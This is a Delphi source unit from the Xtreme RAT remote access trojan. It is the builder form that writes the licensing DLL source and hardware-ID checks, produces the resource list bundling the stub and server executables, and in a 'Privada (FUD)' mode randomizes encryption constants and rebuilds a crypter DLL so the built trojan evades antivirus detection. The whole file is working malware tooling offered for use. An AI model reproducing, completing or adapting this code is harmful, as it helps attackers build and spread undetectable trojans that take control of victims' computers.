unit UnitCompilar;

interface

uses
  Windows, Messages, SysUtils, Variants, Classes, Graphics, Controls, Forms,
  Dialogs, sSkinManager, Buttons, StdCtrls, ExtCtrls;

type
  TFormCompilar = class(TForm)
    sSkinManager1: TsSkinManager;
    Label1: TLabel;
    Edit1: TEdit;
    Memo1: TMemo;
    SpeedButton1: TSpeedButton;
    RadioGroup1: TRadioGroup;
    Memo2: TMemo;
    Label2: TLabel;
    Label3: TLabel;
    SaveDialog1: TSaveDialog;
    CheckBox1: TCheckBox;
    CheckBox2: TCheckBox;
    procedure FormShow(Sender: TObject);
    procedure Edit1Change(Sender: TObject);
    procedure SpeedButton1Click(Sender: TObject);
    procedure RadioGroup1Click(Sender: TObject);
    procedure Label3Click(Sender: TObject);
    procedure Memo1Change(Sender: TObject);
  private
    { Private declarations }
  public
    { Public declarations }
  end;

var
  FormCompilar: TFormCompilar;

implementation

{$R *.dfm}

uses
  MD5,
  HardwareID,
  UnitCryptString,
  StrUtils;

var
  InsertNode: ansistring =
'library InsertNode;' + #13#10 +
'' + #13#10 +
'{$I Compilar.inc}' + #13#10 +
'uses' + #13#10 +
'  windows,' + #13#10 +
'  Functions,' + #13#10 +
'  SysUtils,' + #13#10 +
'  UrlMon,' + #13#10 +
'  ShellApi,' + #13#10 +
'  Activex,' + #13#10 +
'  VirtualTrees,' + #13#10 +
'  HardwareId,' + #13#10 +
'  UnitCryptString,' + #13#10 +
'  MD5;' + #13#10 +
'' + #13#10 +
'const          //Meu computador = cbeba5738267e0c5334306e9b23cbe5b' + #13#10 +
'  PrivateID = ' + '''' + 'XXXXXXXXXXXXXXXXXXXX' + '''' + ';' + #13#10 +
'var' + #13#10 +
'  isPrivate: boolean;' + #13#10 +
'' + #13#10 +
'function InsertServer(TV: TVirtualStringTree; InsertInto: pVirtualNode; Obj: TObject): pVirtualNode;' + #13#10 +
'var' + #13#10 +
'  i: integer;' + #13#10 +
'  Node: pVirtualNode;' + #13#10 +
'begin' + #13#10 +
'  Result := nil;' + #13#10 +
'  if IsPrivate = False then' + #13#10 +
'  begin' + #13#10 +
'    Node := TV.GetFirst;' + #13#10 +
'    i := 0;' + #13#10 +
'    while Assigned(Node) do' + #13#10 +
'    begin' + #13#10 +
'      if TV.GetNodeLevel(Node) > 0 then inc(i);' + #13#10 +
'      Node := TV.GetNext(Node);' + #13#10 +
'    end;' + #13#10 +
'    if i >= 5 then Exit;' + #13#10 +
'  end;' + #13#10 +
'  Result := TV.InsertNode(InsertInto, amAddChildFirst, Obj);' + #13#10 +
'end;' + #13#10 +
'' + #13#10 +
'Type' + #13#10 +
'  TMeuObjetoInterface = class(TInterfacedObject, IBindStatusCallback)' + #13#10 +
'  public' + #13#10 +
'    function OnStartBinding(dwReserved: DWORD; pib: IBinding): HResult; stdcall;' + #13#10 +
'    function GetPriority(out nPriority): HResult; stdcall;' + #13#10 +
'    function OnLowResource(reserved: DWORD): HResult; stdcall;' + #13#10 +
'    function OnProgress(ulProgress, ulProgressMax, ulStatusCode: ULONG; szStatusText: LPCWSTR): HResult; stdcall;' + #13#10 +
'    function OnStopBinding(hresult: HResult; szError: LPCWSTR): HResult; stdcall;' + #13#10 +
'    function GetBindInfo(out grfBINDF: DWORD; var bindinfo: TBindInfo): HResult; stdcall;' + #13#10 +
'    function OnDataAvailable(grfBSCF: DWORD; dwSize: DWORD; formatetc: PFormatEtc; stgmed: PStgMedium): HResult; stdcall;' + #13#10 +
'    function OnObjectAvailable(const iid: TGUID; punk: IUnknown): HResult; stdcall;' + #13#10 +
'  end;' + #13#10 +
'' + #13#10 +
'var' + #13#10 +
'  FCancelDownLoad: boolean;' + #13#10 +
'' + #13#10 +
'function TMeuObjetoInterface.OnStartBinding(dwReserved: DWORD; pib: IBinding): HResult;' + #13#10 +
'begin' + #13#10 +
'end;' + #13#10 +
'' + #13#10 +
'function TMeuObjetoInterface.GetPriority(out nPriority): HResult;' + #13#10 +
'begin' + #13#10 +
'end;' + #13#10 +
'' + #13#10 +
'function TMeuObjetoInterface.OnLowResource(reserved: DWORD): HResult;' + #13#10 +
'begin' + #13#10 +
'end;' + #13#10 +
'' + #13#10 +
'function TMeuObjetoInterface.OnStopBinding(hresult: HResult; szError: LPCWSTR): HResult;' + #13#10 +
'begin' + #13#10 +
'end;' + #13#10 +
'' + #13#10 +
'function TMeuObjetoInterface.GetBindInfo(out grfBINDF: DWORD; var bindinfo: TBindInfo): HResult;' + #13#10 +
'begin' + #13#10 +
'end;' + #13#10 +
'' + #13#10 +
'function TMeuObjetoInterface.OnDataAvailable(grfBSCF: DWORD; dwSize: DWORD; formatetc: PFormatEtc; stgmed: PStgMedium): HResult;' + #13#10 +
'begin' + #13#10 +
'end;' + #13#10 +
'' + #13#10 +
'function TMeuObjetoInterface.OnObjectAvailable(const iid: TGUID; punk: IUnknown): HResult;' + #13#10 +
'begin' + #13#10 +
'end;' + #13#10 +
'' + #13#10 +
'function TMeuObjetoInterface.OnProgress(ulProgress, ulProgressMax,' + #13#10 +
'  ulStatusCode: ULONG; szStatusText: LPCWSTR): HResult;' + #13#10 +
'begin' + #13#10 +
'  if FCancelDownLoad = True then // Download abort?' + #13#10 +
'    Result := E_ABORT else' + #13#10 +
'' + #13#10 +
'  case ulStatusCode of' + #13#10 +
'    1: if (pos(' + '''' + 'sites.google.com' + '''' + ', ' + 'szStatusText) <= 0) and ' + #13#10 +
'          (pos(' + '''' + 'sites.googlegroups.com' + '''' + ', ' + 'szStatusText) <= 0) then Result := E_ABORT;' + #13#10 +
'    //2: if pos(' + '''' + '74.125' + '''' + ', ' + 'szStatusText) <= 0 then Result := E_ABORT;' + #13#10 +
'    3: if pos(' + '''' + 'googlegroups.com/site/nxtremerat/' + '''' + ', ' + 'szStatusText) <= 0 then Result := E_ABORT;' + #13#10 +
'    4: if pos(' + '''' + 'googlegroups.com/site/nxtremerat/' + '''' + ', ' + 'szStatusText) <= 0 then Result := E_ABORT;' + #13#10 +
'  end;' + #13#10 +
'  if Result = E_ABORT then begin FCancelDownLoad := True; {Messagebox(0, szStatusText, pChar(IntToStr(ulStatusCode)), 0);} ExitProcess(0); end;' + #13#10 +
'end;' + #13#10 +
'' + #13#10 +
'var' + #13#10 +
'  s: WideString = ' + '''' + 'XtremeRAT' + '''' + ';' + #13#10 +
'function GetPrivateID: string;' + #13#10 +
'begin' + #13#10 +
'  Result := s;' + #13#10 +
'end;' + #13#10 +
'' + #13#10 +
'exports' + #13#10 +
'  InsertServer name ' + '''' + 'InsertServer' + '''' + ',' + #13#10 +
'  GetPrivateID name ' + '''' + 'GetPrivateID' + '''' + ';' + #13#10 +
'' + #13#10 +
'var' + #13#10 +
'  i: int64;' + #13#10 +
'  p: pointer;' + #13#10 +
'  d: boolean;' + #13#10 +
'  MeuEstatus: TMeuObjetoInterface;' + #13#10 +
'begin' + #13#10 +
'  DeleteFile(ExtractFilePath(ParamStr(0)) + ' + '''' + 'PrivateID.txt' + '''' + ');' + #13#10 +
'  isPrivate := false;' + #13#10 +
'{$IFNDEF XTREMETRIAL}' + #13#10 +
'  FCancelDownLoad := False;' + #13#10 +
'  MeuEstatus := TMeuObjetoInterface.Create;' + #13#10 +
'  isPrivate := UrlDownloadToFile(nil,' + #13#10 +
'                    pchar(' + '''' + 'DOWNLOADLINK' + '''' + '),' + #13#10 +
'                    pchar(ExtractFilePath(ParamStr(0)) + ' + '''' + 'PrivateID.txt' + '''' + '),' + #13#10 +
'                    0,' + #13#10 +
'                    MeuEstatus) = 0;' + #13#10 +
'  d := isPrivate;' + #13#10 +
'  if isPrivate then' + #13#10 +
'  begin' + #13#10 +
'    i := LerArquivo(pchar(ExtractFilePath(ParamStr(0)) + ' + '''' + 'PrivateID.txt' + '''' + '), p);' + #13#10 +
'    EnDecryptStrRC4B(p, i, ' + '''' + 'XTREME' + '''' + ');' + #13#10 +
'    SetLength(s, i div 2);' + #13#10 +
'    CopyMemory(@s[1], p, i);' + #13#10 +
'    isPrivate := s = PrivateID;' + #13#10 +
'    DeleteFile(ExtractFilePath(ParamStr(0)) + ' + '''' + 'PrivateID.txt' + '''' + ');' + #13#10 +
'  end;' + #13#10 +
'//IFNOTCONNECT' + #13#10 +
'  if isPrivate = false then' + #13#10 +
'  begin' + #13#10 +
'    MessageBox(0, ' + '''' + 'Licensing for this product has a error or has expired!!!' + '''' + '#13#10' + '''' + 'Contact the coder for more info.' + '''' + ', ' + '''' + 'Xtreme RAT' + '''' + ', ' + 'MB_OK + MB_ICONERROR' + ');' + #13#10 +
'    ExitProcess(0);' + #13#10 +
'  end;' + #13#10 +
'{$ENDIF}' + #13#10 +
'end.';

  Resources: ansistring =
'GEOIP geoipfile xgeoip.dat' + #13#10 +
'SOUND soundfile Risada_MK2.WAV' + #13#10 +
'UPX upxfile xupx.exe' + #13#10 +
'SQLITE sqlitefile Mysqlite3.dll' + #13#10 +
'STUB stubfile stub.exe' + #13#10 +
'SERVER serverfile servidor.exe' + #13#10 +
'LANG langfile lang.ini' + #13#10 +
'IMGPOPUP imgpopup ImageNotify.jpg' + #13#10 +
'SKIN skinfile Garnet.asz' + #13#10 +
'NOIP noipfile noip.jpg' + #13#10 +
'DYNDNS dyndnsfile dyndns.jpg' + #13#10 +
'INSERTSERVER insertserverfile InsertNode.dll' + #13#10 +
'IMGDISCONNECT imgdisconnect Disconnected.jpg' + #13#10 +
'RAR rarfile rar.exe' + #13#10 +
'RARREG rarregfile rarreg.key' + #13#10 +
'DLLCRYPT dllcryptfile dllcrypt.dll';

  UnitPrivada: ansistring =
'unit UnitPrivada;' + #13#10 +
'interface' + #13#10 +
'const          //Meu computador = cbeba5738267e0c5334306e9b23cbe5b' + #13#10 +
'  PrivateID = ' + '''' + 'XtremeRAT' + '''' + ';' + #13#10 +
'implementation' + #13#10 +
'end.';

  UnitConstantes: ansistring =
'Unit UnitConstantes;' + #13#10 +
'' + #13#10 +
'interface' + #13#10 +
'' + #13#10 +
'function MyCryptFunction(Str, Password: string): string;' + #13#10 +
'' + #13#10 +
'const' + #13#10 +
'  MasterDelimitador = ' + '''' + 'ABCDE' + '''' + ';' + #13#10 +
'  CryptPass = ' + '''' + 'FGHIJ' + '''' + ';' + #13#10 +
'' + #13#10 +
'implementation' + #13#10 +
'' + #13#10 +
'uses UnitCryptString;' + #13#10 +
'' + #13#10 +
'const' + #13#10 +
'  Codes64 = ' + '''' + 'XXXXX' + '''' + ';' + #13#10 +
'function MyCryptFunction(Str, Password: string): string;' + #13#10 +
'begin' + #13#10 +
'  if copy(str, 1, length(' + '''' + 'KLMNO' + '''' + ')) = ' + '''' + 'KLMNO' + '''' + ' then' + #13#10 +
'  begin' + #13#10 +
'    delete(str, 1, length(' + '''' + 'KLMNO' + '''' + '));' + #13#10 +
'    Result := Decode64(Str, Codes64);' + #13#10 +
'  end else' + #13#10 +
'  begin' + #13#10 +
'    Result := Encode64(Str, Codes64);' + #13#10 +
'    Result := ' + '''' + 'KLMNO' + '''' + ' + Result;' + #13#10 +
'  end;' + #13#10 +
'end;' + #13#10 +
'' + #13#10 +
'end.';

function CriarArquivo(NomedoArquivo: pWideChar; Buffer: pWideChar; Size: int64): boolean;
var
  hFile: THandle;
  lpNumberOfBytesWritten: DWORD;
begin
  result := False;

  hFile := CreateFileW(NomedoArquivo, GENERIC_WRITE, FILE_SHARE_WRITE, nil, CREATE_ALWAYS, 0, 0);

  if hFile <> INVALID_HANDLE_VALUE then
  begin
    if Size = INVALID_HANDLE_VALUE then
    SetFilePointer(hFile, 0, nil, FILE_BEGIN);
    Result := WriteFile(hFile, Buffer[0], Size, lpNumberOfBytesWritten, nil);
  end;

  CloseHandle(hFile);
end;

procedure TFormCompilar.Edit1Change(Sender: TObject);
begin
  Memo1.Clear;
  if Edit1.Text <> '' then
  Memo1.Text := MD5.MD5Print(MD5.MD5String(Edit1.Text));
  Memo2.Text := 'https://sites.google.com/site/nxtremerat/' + Memo1.Text + '.txt?attredirects=0&d=1';
end;

procedure TFormCompilar.FormShow(Sender: TObject);
begin
  Edit1.Text := IntToStr(GetHardwareid);
  CheckBox1.Checked := False;
end;

procedure TFormCompilar.Label3Click(Sender: TObject);
var
  TempStr: WideString;
  p: pointer;
  i: int64;
begin
  SaveDialog1.FileName := Memo1.Text + '.txt';
  if SaveDialog1.Execute then
  begin
    TempStr := Memo1.Text;
    GetMem(p, Length(TempStr) * 2);
    CopyMemory(p, @TempStr[1], Length(TempStr) * 2);
    EnDecryptStrRC4B(p, Length(TempStr) * 2, 'XTREME');
    CriarArquivo(pWideChar(SaveDialog1.FileName), p, Length(TempStr) * 2);
    MessageBox(0, 'Arquivo criado com sucesso!'#13#10'Observe o link para o registro.', 'Xtreme RAT', MB_OK + MB_ICONINFORMATION);
  end;
end;

procedure TFormCompilar.Memo1Change(Sender: TObject);
begin
  Memo2.Text := 'https://sites.google.com/site/nxtremerat/' + Memo1.Text + '.txt?attredirects=0&d=1';
end;

procedure TFormCompilar.RadioGroup1Click(Sender: TObject);
begin
  Label3.Enabled := RadioGroup1.ItemIndex > 0;
  Memo2.Enabled := Label3.Enabled;
end;

function ExecAndWait(const CommandLine: string;
  const WindowState: Word): boolean;
var
  SUInfo: windows.TStartupInfo;
  ProcInfo: windows.TProcessInformation;
begin
  { Coloca o nome do arquivo entre aspas. Isto é necessário devido
    aos espaços contidos em nomes longos }
  FillChar(SUInfo, SizeOf(SUInfo), #0);
  with SUInfo do
  begin
    cb := SizeOf(SUInfo);
    dwFlags := STARTF_USESHOWWINDOW;
    wShowWindow := WindowState;
  end;
  Result := CreateProcess(nil, PChar(CommandLine), nil, nil, false,
    CREATE_NEW_CONSOLE or NORMAL_PRIORITY_CLASS, nil,
    nil, SUInfo, ProcInfo);

  { Aguarda até ser finalizado }
  if Result then
  begin
    WaitForSingleObject(ProcInfo.hProcess, INFINITE);
    { Libera os Handles }
    CloseHandle(ProcInfo.hProcess);
    CloseHandle(ProcInfo.hThread);
  end;
end;

function RandomString(QtdeChars: integer): string;
const
  Chars = '0123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijklmnopqrstuwxyz_-';
var
  S: string;
  i, N: integer;
begin
  Randomize;
  S := '';
  for i := 1 to QtdeChars do
  begin
    N := Random(Length(Chars)) + 1;
    S := S + Chars[N];
  end;
  Result := S;
end;

function RandomString64: string;
const
  Chars = '0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz+/';
var
  S: string;
  i, N: integer;
begin
  Randomize;
  S := '';
  while Length(s) < 64 do
  begin
    N := 1 + Random(Length(Chars));
    if pos(Chars[N], S) > 0 then continue;
    S := S + Chars[N];
  end;
  Result := S;
end;

procedure TFormCompilar.SpeedButton1Click(Sender: TObject);
var
  Stream: TMemoryStream;
  TempStr, aaa, bbb, ccc, ddd: string;
  p: pointer;
  Size: int64;
begin
  Randomize;

  if RadioGroup1.ItemIndex = 0 then //Avaliação
  begin
    TempStr := '{$DEFINE XTREMETRIAL}';
    CriarArquivo(pWideChar(ExtractFilePath(ParamStr(0)) + 'Compilar.inc'), pWideChar(ansistring(TempStr)), Length(TempStr));
    CriarArquivo(pWideChar(ExtractFilePath(ParamStr(0)) + 'Units\Compilar.inc'), pWideChar(ansistring(TempStr)), Length(TempStr));

    TempStr := InsertNode;
    TempStr := StrUtils.ReplaceStr(TempStr, 'XXXXXXXXXXXXXXXXXXXX', 'XtremeRAT');
    CriarArquivo(pWideChar(ExtractFilePath(ParamStr(0)) + 'InsertNode.dpr'), pWideChar(ansistring(TempStr)), Length(TempStr));

    TempStr := Resources;
    TempStr := StrUtils.ReplaceStr(TempStr, 'DLLCRYPT dllcryptfile dllcrypt.dll', '');
    CriarArquivo(pWideChar(ExtractFilePath(ParamStr(0)) + 'Resources\resources.rc'), pWideChar(ansistring(TempStr)), Length(TempStr));
  end else


  if RadioGroup1.ItemIndex = 1 then //Privada
  begin
    // Meu Computador = cbeba5738267e0c5334306e9b23cbe5b
    if CheckBox2.Checked then
    begin
      TempStr := #13#10 +
                 '  begin' + #13#10 +
                 '    s := ' + '''' + Memo1.Text + '''' + ';' + #13#10 +
                 '    IsPrivate := s = PrivateID;' + #13#10 +
                 '  end;' + #13#10;
      InsertNode := StrUtils.ReplaceStr(InsertNode, '//IFNOTCONNECT', TempStr);
    end else
    if CheckBox1.Checked then
    begin
      TempStr := #13#10 +
                 '  if (d = false) and (IsPrivate = False) then' + #13#10 +
                 '  begin' + #13#10 +
                 '    s := MD5.MD5Print(MD5.MD5String(IntToStr(GetHardwareid)));' + #13#10 +
                 '    IsPrivate := s = PrivateID;' + #13#10 +
                 '  end;' + #13#10;
      InsertNode := StrUtils.ReplaceStr(InsertNode, '//IFNOTCONNECT', TempStr);
    end;

    TempStr := '{$DEFINE XTREMEPRIVATE}';
    CriarArquivo(pWideChar(ExtractFilePath(ParamStr(0)) + 'Compilar.inc'), pWideChar(ansistring(TempStr)), Length(TempStr));
    CriarArquivo(pWideChar(ExtractFilePath(ParamStr(0)) + 'Units\Compilar.inc'), pWideChar(ansistring(TempStr)), Length(TempStr));

    TempStr := InsertNode;
    TempStr := StrUtils.ReplaceStr(TempStr, 'XXXXXXXXXXXXXXXXXXXX', Memo1.Text);
    TempStr := StrUtils.ReplaceStr(TempStr, 'DOWNLOADLINK', Memo2.Text);
    CriarArquivo(pWideChar(ExtractFilePath(ParamStr(0)) + 'InsertNode.dpr'), pWideChar(ansistring(TempStr)), Length(TempStr));

    TempStr := Resources;
    TempStr := StrUtils.ReplaceStr(TempStr, 'DLLCRYPT dllcryptfile dllcrypt.dll', '');
    CriarArquivo(pWideChar(ExtractFilePath(ParamStr(0)) + 'Resources\resources.rc'), pWideChar(ansistring(TempStr)), Length(TempStr));

    TempStr := UnitPrivada;
    TempStr := StrUtils.ReplaceStr(TempStr, 'XtremeRAT', MD5.MD5Print(MD5.MD5String(Memo1.Text)));
    CriarArquivo(pWideChar(ExtractFilePath(ParamStr(0)) + 'Servidor\UnitPrivada.pas'), pWideChar(ansistring(TempStr)), Length(TempStr));

  end else


  if RadioGroup1.ItemIndex = 2 then //Privada (FUD)
  begin
    // Meu Computador = cbeba5738267e0c5334306e9b23cbe5b
    if CheckBox2.Checked then
    begin
      TempStr := #13#10 +
                 '  begin' + #13#10 +
                 '    s := ' + '''' + Memo1.Text + '''' + ';' + #13#10 +
                 '    IsPrivate := s = PrivateID;' + #13#10 +
                 '  end;' + #13#10;
      InsertNode := StrUtils.ReplaceStr(InsertNode, '//IFNOTCONNECT', TempStr);
    end else
    if CheckBox1.Checked then
    begin
      TempStr := #13#10 +
                 '  if (d = false) and (IsPrivate = False) then' + #13#10 +
                 '  begin' + #13#10 +
                 '    s := MD5.MD5Print(MD5.MD5String(IntToStr(GetHardwareid)));' + #13#10 +
                 '    IsPrivate := s = PrivateID;' + #13#10 +
                 '  end;' + #13#10;
      InsertNode := StrUtils.ReplaceStr(InsertNode, '//IFNOTCONNECT', TempStr);
    end;

    TempStr := '{$DEFINE XTREMEPRIVATEFUD}';
    CriarArquivo(pWideChar(ExtractFilePath(ParamStr(0)) + 'Compilar.inc'), pWideChar(ansistring(TempStr)), Length(TempStr));
    CriarArquivo(pWideChar(ExtractFilePath(ParamStr(0)) + 'Units\Compilar.inc'), pWideChar(ansistring(TempStr)), Length(TempStr));

    TempStr := InsertNode;
    TempStr := StrUtils.ReplaceStr(TempStr, 'XXXXXXXXXXXXXXXXXXXX', Memo1.Text);
    TempStr := StrUtils.ReplaceStr(TempStr, 'DOWNLOADLINK', Memo2.Text);
    CriarArquivo(pWideChar(ExtractFilePath(ParamStr(0)) + 'InsertNode.dpr'), pWideChar(ansistring(TempStr)), Length(TempStr));

    TempStr := Resources;
    CriarArquivo(pWideChar(ExtractFilePath(ParamStr(0)) + 'Resources\resources.rc'), pWideChar(ansistring(TempStr)), Length(TempStr));

    TempStr := UnitPrivada;
    TempStr := StrUtils.ReplaceStr(TempStr, 'XtremeRAT', MD5.MD5Print(MD5.MD5String(Memo1.Text)));
    CriarArquivo(pWideChar(ExtractFilePath(ParamStr(0)) + 'Servidor\UnitPrivada.pas'), pWideChar(ansistring(TempStr)), Length(TempStr));

    TempStr := UnitConstantes;
    aaa := RandomString(10 + Random(30));
    bbb := RandomString(10 + Random(30));
    ccc := RandomString(10 + Random(30));
    ddd := RandomString64;
    TempStr := StrUtils.ReplaceStr(TempStr, 'ABCDE', aaa);
    TempStr := StrUtils.ReplaceStr(TempStr, 'FGHIJ', bbb);
    TempStr := StrUtils.ReplaceStr(TempStr, 'KLMNO', ccc);
    TempStr := StrUtils.ReplaceStr(TempStr, 'XXXXX', ddd);
    CriarArquivo(pWideChar(ExtractFilePath(ParamStr(0)) + 'dllcrypt\UnitConstantes.pas'), pWideChar(ansistring(TempStr)), Length(TempStr));

    DeleteFile(ExtractFilePath(ParamStr(0)) + 'dllcrypt\dllcrypt.dll');
    ExecAndWait('"' + ExtractFilePath(ParamStr(0)) + 'dllcrypt\build.bat" ' + Memo1.Text, SW_NORMAL);

    CopyFile(pchar(ExtractFilePath(ParamStr(0)) + 'dllcrypt\dllcrypt.dll'), pchar(ExtractFilePath(ParamStr(0)) + 'resources\dllcrypt.dll'), False);
  end;

  Halt;
end;

end.
